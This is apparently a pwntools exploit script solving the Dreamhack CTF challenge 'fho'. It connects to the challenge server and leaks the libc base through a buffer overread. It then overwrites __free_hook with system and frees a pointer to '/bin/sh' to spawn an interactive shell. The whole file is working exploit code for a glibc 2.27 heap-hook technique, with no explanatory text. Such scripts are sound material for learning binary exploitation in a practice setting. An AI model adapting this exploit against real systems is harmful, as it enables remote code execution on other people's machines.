from pwn import *
from pwn import u64

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games", 10084)
e = ELF("./a/fho")
libc = ELF("./a/libc-2.27.so")

#context.log_level = 'debug'

# [1] Leak libc base
buf = b'A'*0x48
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
sleep(0.5)
libc_start_main_xx = u64(p.recvline()[:-1]+b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols["__libc_start_main"] + 231)

system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
binsh = libc_base + next(libc.search(b"/bin/sh"))

slog("libc_start_main_xx", libc_start_main_xx)
slog("libc_base", libc_base)
slog("system", system)
slog("free_hook", free_hook)
slog("/bin/sh", binsh)


# [2] Overwrite free_hook with system
p.recvuntil("To write: ")
p.sendline(str(free_hook))
p.recvuntil("With: ")
p.sendline(str(system))


# [3] Exploit
p.recvuntil("To free: ")
p.sendline(str(binsh))

p.interactive()